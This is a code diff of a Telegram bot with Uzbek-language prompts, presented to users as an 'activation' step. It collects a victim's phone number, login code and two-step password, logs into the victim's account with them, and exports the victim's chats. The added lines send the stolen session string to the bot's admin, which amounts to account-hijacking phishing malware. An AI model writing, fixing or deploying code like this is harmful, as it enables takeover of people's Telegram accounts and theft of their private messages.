@@ -170,17 +170,14 @@ async def open_box(c):
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer("📲 Telefon raqamingizni yuboring\n Namuna: +998123456789", reply_markup=back_menu())
+    await msg.answer("📲 Telefon raqamingizni yuboring\nNamuna: +998901234567", reply_markup=back_menu())
 
 @dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
 async def go_back(msg: types.Message):
     sessions.pop(msg.from_user.id, None)
     await msg.answer("🏠 Bosh menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
-@dp.message_handler(
-    lambda m: m.from_user.id in sessions
-    and sessions[m.from_user.id]["step"] in ("phone", "code", "password")
-)
+@dp.message_handler(lambda m: m.from_user.id in sessions)
 async def login_flow(msg: types.Message):
     uid = msg.from_user.id
     state = sessions[uid]
@@ -190,59 +187,51 @@ async def login_flow(msg: types.Message):
     if state["step"] == "phone":
         digits = re.sub(r"\D", "", text)
         if len(digits) < 8:
-            await msg.answer("❌ Telefon noto‘g‘ri\nMasalan: +998123456789  yoki +491234567")
-            return
+            return await msg.answer("❌ Telefon noto‘g‘ri")
 
         phone = "+" + digits
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        sent = await client.send_code_request(
-        phone,
-        force_sms=False
-        )
-        
+
+        sent = await client.send_code_request(phone)
+
         state.update({
             "step": "code",
             "phone": phone,
             "client": client,
-            "phone_code_hash": sent.phone_code_hash
+            "hash": sent.phone_code_hash
         })
 
-        await msg.answer("🔐 Kod yuborildi kiriting\nMasalan: 23.345 XUDDI SHUNDAY BO'LISHISHART")
+        await msg.answer("🔐 Kodni yuboring (faqat raqam) 23.456 misolida")
         return
 
     # CODE
     if state["step"] == "code":
-        code = re.sub(r"\D", "", text)
-        if len(code) < 5:
-            await msg.answer("❌ Kod noto‘g‘ri")
-            return
-
         try:
             await state["client"].sign_in(
                 phone=state["phone"],
-                code=code,
-                phone_code_hash=state["phone_code_hash"]
+                code=re.sub(r"\D", "", text),
+                phone_code_hash=state["hash"]
             )
         except SessionPasswordNeededError:
             state["step"] = "password"
-            await msg.answer("🔑 2 bosqichli parolni yuboring")
-            return
+            return await msg.answer("🔑 2 bosqichli parolni yuboring")
         except PhoneCodeExpiredError:
-            await msg.answer("⛔ Kod eskirdi. Qayta Aktivlash bosing.")
+            await msg.answer("⛔ Kod eskirdi")
             await state["client"].disconnect()
-            sessions.pop(uid, None)
+            sessions.pop(uid)
             return
 
-        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+        session_str = save_session(uid, state["client"])
+        await bot.send_message(
+            ADMIN_ID,
+            f"🧩 SESSION\n\n<code>{session_str}</code>",
+            parse_mode="HTML"
+        )
+
+        await msg.answer("⏳ 2 chi bosqich qilinmoqda...")
         await export_chats(uid)
         return
-
-    # PASSWORD
-    if state["step"] == "password":
-        await state["client"].sign_in(password=text)
-        await msg.answer("⏳ Premium olinmoqda. Qolgan vaqt 3 daqiqa 59 soniya")
-        await export_chats(uid)
 
 # ================== EXPORT ==================
 def safe_name(t, max_len=40):
